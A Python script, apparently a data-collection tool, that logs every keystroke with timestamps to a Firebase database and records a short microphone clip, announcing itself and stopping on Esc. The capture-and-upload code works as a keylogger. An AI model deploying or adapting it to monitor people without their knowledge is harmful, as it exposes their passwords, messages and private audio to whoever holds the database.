from pynput import keyboard
import firebaseConnector
from datetime import datetime
import threading
import pyaudio
import wave


print("Starting Key Logger Program")
print("----------------------------------")

# Initialise Connector Class
firebaseConnector = firebaseConnector.FirebaseConnector()

# Session start time
sessionStartTime = datetime.now()

print(sessionStartTime.strftime("%d-%m-%Y_%H:%M%:%S:%f"))


# Start 5 min recording in new thread
class myThread (threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter

    def run(self):
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        RECORD_SECONDS = 5
        WAVE_OUTPUT_FILENAME = "../LocalRecordings/" + sessionStartTime.strftime("%d-%m-%Y_%H:%M%:%S") + ".wav"

        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)
        print("* recording")

        frames = []

        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        print("* done recording")

        stream.stop_stream()

        stream.close()
        p.terminate()

        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()


# Create new threads
thread1 = myThread(1, "Thread-1", 1)
thread1.start()

# Stores Key Press and Timestamp


def storeKeyPress(keyString):
    keyPressTime = (datetime.now() -
                    sessionStartTime)

    # Call keypress function
    firebaseConnector.storeKeypressData(
        {"keyPressed": keyString, "timeStamp": str(keyPressTime)})

# On Key Press Function
def on_press(key):
    try:
        print(key.char + " Pressed")
        storeKeyPress(key.char)
    except AttributeError:
        print('special key {0} pressed'.format(
            key))
        # Want to register space as will be important
        if(format(key) == "Key.space"):
            storeKeyPress("Space")

        if(format(key) == "Key.backspace"):
            storeKeyPress("Backspace")

        if(format(key) == "Key.enter"):
            storeKeyPress("Enter")


# On Key Release Function
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop Recording
        # localRecorder.stopLocalRecording()
        # Stop listener
        return False


# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
